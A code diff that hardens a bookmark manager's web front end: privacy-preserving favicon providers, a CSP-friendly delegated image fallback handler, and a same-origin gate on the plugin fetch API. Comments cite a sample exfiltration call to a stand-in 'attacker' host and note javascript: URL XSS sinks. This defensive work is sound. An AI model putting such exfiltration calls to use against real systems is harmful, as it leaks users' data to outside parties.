@@ -154,16 +154,46 @@ const els = {
 function domain(url) {
   try { return new URL(url).hostname; } catch { return ""; }
 }
+
+// Favicon provider — picked at boot from /api/info (server reads
+// [web].favicon_provider). Default "none" hides the privacy leak that
+// firing every bookmark's hostname at google.com/s2/favicons used to
+// produce. (P4-02)
+//   "none"   → bundled SVG fallback for every row.
+//   "local"  → /api/favicon?domain=<d> proxy (server-side fetch, cached).
+//   "google" → legacy https://www.google.com/s2/favicons (privacy-leaky).
+let _faviconProvider = "none";
+function setFaviconProvider(p) {
+  _faviconProvider = (p === "google" || p === "local") ? p : "none";
+}
 function faviconUrl(url) {
   const d = domain(url);
   if (!d) return DEFAULT_FAV;
-  return `https://www.google.com/s2/favicons?sz=64&domain=${encodeURIComponent(d)}`;
+  if (_faviconProvider === "google") {
+    return `https://www.google.com/s2/favicons?sz=64&domain=${encodeURIComponent(d)}`;
+  }
+  if (_faviconProvider === "local") {
+    return `/api/favicon?domain=${encodeURIComponent(d)}`;
+  }
+  return DEFAULT_FAV;
 }
 function escapeHtml(s) {
   return String(s ?? "").replace(/[&<>"']/g, (c) => ({
     "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;",
   }[c]));
 }
+
+// Delegated favicon-fallback handler (P4-04). Replaces the previous
+// inline `onerror=` attribute, which would have required CSP
+// `script-src 'unsafe-inline'`. Any <img data-fallback-fav> falls back
+// to the bundled SVG when its src fails to load.
+document.addEventListener("error", (e) => {
+  const img = e.target;
+  if (img && img.tagName === "IMG" && img.dataset && img.dataset.fallbackFav) {
+    delete img.dataset.fallbackFav;
+    img.src = DEFAULT_FAV;
+  }
+}, true);
 // Mirror of core.url_safety.SAFE_URL_SCHEMES on the wire side. `escapeHtml`
 // only neutralises attribute breakouts — it does NOT block `javascript:` /
 // `data:` / `vbscript:` schemes from becoming click-to-XSS sinks once
@@ -560,7 +590,7 @@ function renderItemsGrid(host, items, opts = {}) {
     return `<li class="g-tile" data-id="${escapeHtml(bm.id)}" tabindex="0">
       <div class="g-thumb">
         <img class="g-fav" src="${escapeHtml(fav)}" alt="" loading="lazy"
-             onerror="this.onerror=null;this.src='${DEFAULT_FAV}';">
+             data-fallback-fav="1">
         <span class="g-glyph" title="${escapeHtml(kind)}">${glyph}</span>
         ${imp}
         <div class="tile-actions">${rowActionsHtml(bm)}</div>
@@ -2024,10 +2054,24 @@ const Tabs = (() => {
 // reach the rest of the app through these helpers, never private internals.
 window.booki = window.booki || {};
 window.booki.tabs = Tabs;
+// Same-origin gate (P4-06). Plugin tabs use this helper; without the
+// gate, a plugin could exfiltrate via `booki.api.fetch("https://attacker/…")`.
+// CSP `connect-src 'self'` is the load-bearing defence; this is a
+// best-effort guard so well-behaved plugins fail loudly instead of
+// silently when they try to leave the origin.
+function _samePathOnly(path, opts) {
+  let url;
+  try { url = new URL(path, location.origin); }
+  catch { return Promise.reject(new Error("invalid path")); }
+  if (url.origin !== location.origin) {
+    return Promise.reject(new Error("booki.api.fetch is same-origin only"));
+  }
+  return fetch(url.toString(), opts);
+}
 window.booki.api = {
-  fetch: (path, opts) => fetch(path, opts),
-  get:   (path) => fetch(path).then(r => r.ok ? r.json()
-                                              : Promise.reject(new Error(`HTTP ${r.status}`))),
+  fetch: _samePathOnly,
+  get:   (path) => _samePathOnly(path).then(r => r.ok ? r.json()
+                                                      : Promise.reject(new Error(`HTTP ${r.status}`))),
 };
 window.booki.bookmarks = {
   all: () => state.all.slice(),
@@ -3562,11 +3606,14 @@ loadSchema().then(loadBookmarks).then(loadStats).then(loadLibraryErrors).catch(e
 fetch("/api/info")
   .then(r => r.ok ? r.json() : null)
   .then(info => {
-    const vec = info && info.vector_db;
+    if (!info) return;
+    const vec = info.vector_db;
     if (vec && vec.available === false) {
       _vectorDbLastVec = vec;
       _applyAskAvailability(vec);
     }
+    // Favicon provider chosen at boot — see faviconUrl() comments.
+    setFaviconProvider((info.web || {}).favicon_provider);
   })
   .catch(() => {});
 
